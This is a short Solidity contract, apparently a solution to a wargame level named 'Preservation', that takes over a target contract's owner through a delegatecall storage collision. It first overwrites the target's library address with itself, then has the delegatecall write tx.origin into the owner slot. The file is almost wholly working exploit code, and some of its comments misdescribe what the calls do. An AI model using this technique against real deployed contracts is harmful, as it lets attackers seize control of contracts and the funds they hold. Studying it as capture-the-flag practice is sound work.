// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public whatever;
    address public whatever2;
    address public owner;
    uint256 public storedTime;

    // This attack function will exploit the setFirstTime function to overwrite the `owner` address.
    function attack(address _target) public {
        IPreservation target = IPreservation(_target);

        // First call sets storedTime to the address of this contract
        target.setFirstTime(uint256(address(this)));

        // Second call sets storedTime to the attacker's address (msg.sender)
        target.setFirstTime(uint256(msg.sender));
    }

    // This function will be used as the delegatecall target, and it will modify the storedTime in the target contract
    function setTime(uint256 _owner) public {
        owner = tx.origin;
    }
}
